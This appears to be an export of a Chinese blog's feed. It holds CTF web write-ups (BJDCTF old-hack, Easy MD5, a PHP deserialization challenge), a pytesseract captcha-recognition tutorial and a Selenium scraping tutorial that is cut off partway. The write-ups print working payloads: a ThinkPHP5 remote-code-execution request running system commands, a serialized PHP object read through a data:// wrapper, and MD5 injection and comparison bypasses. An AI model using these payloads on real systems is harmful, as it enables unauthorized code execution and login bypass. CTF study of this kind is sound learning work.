<p>获得了useless.php的base64 解码后得到源码为<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span></span><br><span class="line"><span class="php">        &#125;  </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><br>接下来看到password变量需要进行反序列化的一个操作<br>所以我们这里反序列化这个Flag类：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=<span class="keyword">new</span> Flag();</span><br><span class="line">$flag=serialize($flag);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>pyload:<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:"Flag":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">8</span>:"flag.php";&#125;</span><br></pre></td></tr></table></figure><br>最后F12,得到flag</p>
<h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>打开链接之后，并没有发现什么特别的，看到一个Powered By THINKPHP5</p>
<p>所以百度了一下THINKPHP5是什么东西</p>
<p>经过百度之后，查看到THINKPHP5是为了简化企业级应用开发和敏捷WEB应用开发而诞生的，得知这是一个建站的框架</p>
<p>再加搜索 看到这一篇文章<br><a href="https://www.codercto.com/a/54587.html" target="_blank" rel="noopener">https://www.codercto.com/a/54587.html</a></p>
<p>得知了考察的是任意代码执行漏洞</p>
<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>这里的知识点就是文章中提到的THINKPHP5.X版本的RCE</p>
<p>原来RCE离我那么近</p>
<h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><p>使用文章中的pyload进行测试<br><img src="/img/Nepnep/[BJDCTF2nd]old-hack0.png" alt="avatar"></p>
<p>得到如图所示的界面，接下来pyload:<br><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">ls</span> /</span></span><br></pre></td></tr></table></figure><br><img src="/img/Nepnep/[BJDCTF2nd]old-hack1.png" alt="avatar"></p>
<p>最后cat flag<br><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">cat</span> /<span class="title">flag</span></span></span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>打开之后是个查询窗口，F12也没有什么提示，所以使用BP抓包一下，得到了hint<br>Hint: select * from ‘admin’ where password=md5($pass,true)</p>
<p>查询了一下md5($pass,true)</p>
<p>参考了这些文章：<br><a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a><br><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">https://www.jianshu.com/p/12125291f50d</a><br><a href="https://www.cnblogs.com/tqing/p/11852990.html" target="_blank" rel="noopener">https://www.cnblogs.com/tqing/p/11852990.html</a></p>
<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>1）经过md5加密后：276f722736c95d99e921722cf9ed621c</p>
<p>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b</p>
<p>2）在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true</p>
<p>3）ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
<h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">以下值在md5加密后以<span class="number">0</span>E开头：</span><br><span class="line"></span><br><span class="line">    QNKCDZO</span><br><span class="line">    <span class="number">240610708</span></span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line"></span><br><span class="line">PHP在处理哈希字符串时，它把每一个以“<span class="number">0</span>E”开头的哈希值都解释为<span class="number">0</span>，所以如果两个不同的密码经过哈希以后，其哈希值都是以“<span class="number">0</span>E”开头的，那么PHP将会认为他们相同，都是<span class="number">0</span>。</span><br></pre></td></tr></table></figure>
<h3 id="与"><a href="#与" class="headerlink" title="===与!=="></a>===与!==</h3><p>===是包括变量值与类型完全相等，而==只是复比较两个数的值是否相等。<br>比如：100==“100” 这里用==，因为它们制的值相等，都是知100，结果为道真<br>但是若用===，因为左边是一个整型而右边则是一个字符串类型的数，类型不相同所以结果为假</p>
<h2 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h2><p>直接构造pylioad<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">leveldo4.php?<span class="attribute">password</span>=ffifdyop</span><br></pre></td></tr></table></figure></p>
<p>得到代码<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><br>分析源码发现是非常常规的md5碰撞或者可以采用数组</p>
<p>方法一:md5碰撞<br>pyload:<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">levels91.php?<span class="attribute">a</span>=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></p>
<p>得到源码<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>这里由于使用了===和!== 所以只好使用数组来进行绕过<br><img src="/img/Nepnep/[BJDCTF2nd]old-hack2.png" alt="avatar"></p>
<p>得到flag</p>
<p>方法二：数组<br>pyload:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">levels91.php?a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p>后面的步骤与方法一相同 这里不再细说</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Nepnep</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/5/1-验证码识别</title>
    <url>/2020/05/02/Python3-2020-5-1-%E5%91%A8%E6%8A%A510/</url>
    <content><![CDATA[<h1 id="验证码的识别"><a href="#验证码的识别" class="headerlink" title="验证码的识别"></a>验证码的识别</h1><p>随着爬虫越来越多，许多网站都采取了各种各样的反爬虫机制，其中最常见的就是使用验证码，现在随着技术的发展，验证码已经由数字演变成了字母，滑动，九宫格等各种验证码</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于tesserocr库是比较老的库，目前只更新到只吃python3.7，而由于我的是python3.8经过多次尝试之后，发现还是无法使用，经过查看大量的资料，我使用了另外一个库—pytesseract</p>
<p>pytesseract这个库原理几乎和tesserocr库相同</p>
<h2 id="图形验证码识别"><a href="#图形验证码识别" class="headerlink" title="图形验证码识别"></a>图形验证码识别</h2><p>我们先识别一下最简单的一种验证码，即图形验证码。这种验证码最早出现，也很常见，一般是由4位字母或者数字组成。例如<a href="http://my.cnki.net/Register/CommonRegister.aspx的登录验证码" target="_blank" rel="noopener">http://my.cnki.net/Register/CommonRegister.aspx的登录验证码</a></p>
<h3 id="获取验证码"><a href="#获取验证码" class="headerlink" title="获取验证码"></a>获取验证码</h3><p>首先需要安装pytesseract库</p>
<p>为了便于实验，我们先将验证码图片保存在本地，先测试一下</p>
<p>首先F12打开开发者工具，查看验证码的url<br><img src="/img/python3/验证码0.png" alt="avatar"></p>
<p>接下来访问一下这个aspx<br><img src="/img/python3/验证码1.png" alt="avatar"><br>由于验证码是动态的 所以也没有什么太大的关系</p>
<p>加下来把这个aspx保存下来，命名为code.png</p>
<p>代码：<br><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\code.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Gsee</span><br></pre></td></tr></table></figure></p>
<p>这里新建了一个Image对象，调用了pytesseract的image_to_string()方法，传入该对象即可完成识别，但是要注意的是，由于pytesseract的特殊性，处理图片时，由于图片可能不是RGBA通路的，所以最后在打开图片后等增加image.convert(‘RGB’)语句，保证图片是RGB格式的</p>
<h3 id="验证码处理"><a href="#验证码处理" class="headerlink" title="验证码处理"></a>验证码处理</h3><p>接下来我们换一个验证码，命名为code2.png<br><img src="/img/python3/code2.png" alt="avatar"></p>
<p>重新用以下代码来测试：<br><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\code2.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br></pre></td></tr></table></figure><br>我刷新的这个验证码并没有出现偏差，但是例如<br><img src="/img/python3/test.jpg" alt="avatar"><br>就会出现偏差<br><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\test.jpg'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">thye</span><br></pre></td></tr></table></figure><br>这个时候，其实是因为验证码多余的线条干扰了图片的识别，我们在这里还需要进行额外的处理，如转灰度，二值化等操作</p>
<p>我们可以利用Image对象的convert()方法传入L，即可将图片转为灰度图像<br><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('L')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br><img src="/img/python3/验证码2.png" alt="avatar"></p>
<p>这样就成功将其灰度化</p>
<p>传入1即可将图片进行二值化处理<br><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('<span class="number">1</span>')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br>我们还可以指定二值化的阈值，上面的方法默认采用的是127.不过我们不能直接转换，需要将图片先灰度化，然后化再指定阈值<br><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('L')</span><br><span class="line">threshold=<span class="number">110</span></span><br><span class="line">table=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;threshold:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.point(table,'<span class="number">1</span>')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br><img src="/img/python3/验证码3.png" alt="avatar"><br>这里将阈值调整为110 图片中的内容才能显示完成，阈值的值是根据验证码的情况来确定的，并不是一个定值</p>
<p>我们看到经过处理之后的验证码，线条已经被去除，验证码变得黑白分明，这个时候才重新识别验证码<br><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\test.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'L'</span>)</span><br><span class="line">threshold=<span class="number">110</span></span><br><span class="line">table=[]</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;threshold:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">point</span>(table,<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">fhYe</span><br></pre></td></tr></table></figure><br>针对一些有干扰的图片，我们就可以做一些灰度和二值化的处理，以此来提高图片的正确率</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.tesseror库比较过时，而且版本更新较慢，目前只支持到了python3.7的版本</p>
<p>2.由于tesseror库无法使用，所以采用了pytesseract库，但是由于pytesseract库的特性，只会识别RGB通道的图片，所以需要在每条语句的后面都添加上image.convert(‘RGB’)</p>
<p>3.文字验证码较为简单，但是会有一些斑点或线条等进行干扰，所以需要采用灰度和二值化来进行处理</p>
<p>4.二值化处理之前需要先进行灰度化的处理，并且每个图片需要设置的阈值可能会不同，阈值不是一个定值，需要经常进行更换</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/4/26-Selenuim</title>
    <url>/2020/04/26/Python3-2020-4-26-%E5%91%A8%E6%8A%A59/</url>
    <content><![CDATA[<h1 id="动态渲染页面爬取"><a href="#动态渲染页面爬取" class="headerlink" title="动态渲染页面爬取"></a>动态渲染页面爬取</h1><p>前面了解到了Ajax的分析和爬取方式，这其实也是JavaScript动态渲染页面的一种方式，通过直接分析Ajax,仍然可以借助requests或urllib来实现数据爬取</p>
<p>但是JavaScript的动态渲染页面不止Ajax这一种，例如有些网站的分页是由JavaScript生成的，并非是原始的HTML代码，其中也并不包含Ajax</p>
<h2 id="Selenium的使用"><a href="#Selenium的使用" class="headerlink" title="Selenium的使用"></a>Selenium的使用</h2><p>Selenium是一个自动化测试工具，利用它可以驱动浏览器执行指定的动作，如点击，下来等操作，同时还可以获取浏览器当前呈现的页面的源代码，做到可见即可爬</p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by import By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys import Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait import WebDriverWait</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">try:</span><br><span class="line">    browser.<span class="builtin-name">get</span>(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attribute">input</span>=browser.find_element_by_id('kw')</span><br><span class="line">    input.send_keys(<span class="string">'Python'</span>)</span><br><span class="line">    input.send_keys(Keys.ENTER)</span><br><span class="line">    <span class="attribute">wait</span>=WebDriverWait(browser,10)</span><br><span class="line">    wait.until(EC.presence_of_element_located((By.ID , <span class="string">'content_left'</span>)))</span><br><span class="line">    <span class="builtin-name">print</span>(browser.current_url)</span><br><span class="line">    <span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">    <span class="builtin-name">print</span>(browser.page_source)</span><br><span class="line">finally:</span><br><span class="line">    browser.close()</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">当前URL，cookies和网页源代码</span><br></pre></td></tr></table></figure>
<p>再执行上条指令后，会自动弹出一个Chrome浏览器，浏览器首先会跳转到百度，然后在搜索框中输出Python，接着跳转到搜索结果页面<br><img src="/img/python3/selenium0.png" alt="avatar"><br><img src="/img/python3/selenium1.png" alt="avatar"></p>
<p>这样我们就可以直接拿到JavaScript渲染的结果了</p>
<h3 id="声明浏览器对象"><a href="#声明浏览器对象" class="headerlink" title="声明浏览器对象"></a>声明浏览器对象</h3><p>Selenium支持非常多的浏览器，如Chrome,Firefox,Edge等，还有Android，BlackBerry等手机端浏览器，还支持无界面浏览器PhantomJS</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Firefox()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Edge()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.PhantomJS()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Safari()</span><br></pre></td></tr></table></figure>
<p>这样就完成了浏览器对象的初始化，并将其赋值为browser对象</p>
<h3 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h3><p>我们可以使用get()方法来请求网页，参数传URL即可<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><br>运行后发现，弹出了Chrome浏览器并且自动访问了淘宝，然后控制台输出了淘宝页面的源代码，随后浏览器关闭</p>
<h3 id="查找结点"><a href="#查找结点" class="headerlink" title="查找结点"></a>查找结点</h3><p>selenium可以驱动浏览器完成各种操作，比如填充表单，模拟点击等。比如，我们想要完成向某个输入框输入文字的操作，需要知道这个输入框在哪里，而selenium提供了一系列查找节点的方法</p>
<h4 id="单个节点"><a href="#单个节点" class="headerlink" title="单个节点"></a>单个节点</h4><p>比如，想要从淘宝页面中提取搜索框这个节点，首先观察它的源代码<br><img src="/img/python3/selenium2.png" alt="avatar"><br>可以发现它的id是q,name也是q，此外还有许多其他属性，我们就可以以多种方式获取了<br>比如find_element_by_name()是根据name获取，find_element_by_id()是根据id获取<br>另外，还有根据XPath，CSS选择器等获取方式<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input_first=browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line">input_second=browser.find_element_by_css_selector(<span class="string">'#q'</span>)</span><br><span class="line">input_third=browser.find_element_by_xpath(<span class="string">'//*[@id="q"]'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(input_first,input_second,input_third)</span></span></span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br></pre></td></tr></table></figure></p>
<p>我们发现结果一至，可以看到这三个节点都是WebElement类型<br>获取单个节点的方法：<br><figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>id</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>xpath</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_p</span>artial<span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>tag<span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span><span class="keyword">class</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>css<span class="number">_</span>selector</span><br></pre></td></tr></table></figure><br>此外还提供了通用方法find_element()，它需要传入两个参数，查找方法By和值<br>实际就是上述方法的通用版本</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.<span class="keyword">by</span> <span class="keyword">import</span> <span class="keyword">By</span></span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input_first=browser.find_element(<span class="keyword">By</span>.ID,<span class="string">'q'</span>)</span><br><span class="line">print(input_first)</span><br><span class="line">browser.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">输出结果与上面一至</span><br></pre></td></tr></table></figure>
<h4 id="多个节点"><a href="#多个节点" class="headerlink" title="多个节点"></a>多个节点</h4><p>如果查找的目标在网页中只有一个，那么完全可以使用find_element()方法，但是如果有多个节点，就需要使用find_elements()方法了</p>
<p>比如淘宝导航条的所有条目<br><img src="/img/python3/selenium3.png" alt="avatar"></p>
<p>先查看这些条目，发现都在class为service-bd的ul节点的li节点中<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">lis=browser.find_elements_by_css_selector(<span class="string">'.service-bd li'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(lis)</span></span></span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"7237cd9e-6812-41b2-839c-5a5ef0790077"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"cd8c7478-6486-4376-8c25-a562dad5be68"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"01ac2aac-0431-49f5-9e9b-244fb11a5b99"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5f10b89b-f4f2-4efb-a084-3ce219e81aa2"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"b99fefe4-b5d0-42c9-84d2-068ba0738d53"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span 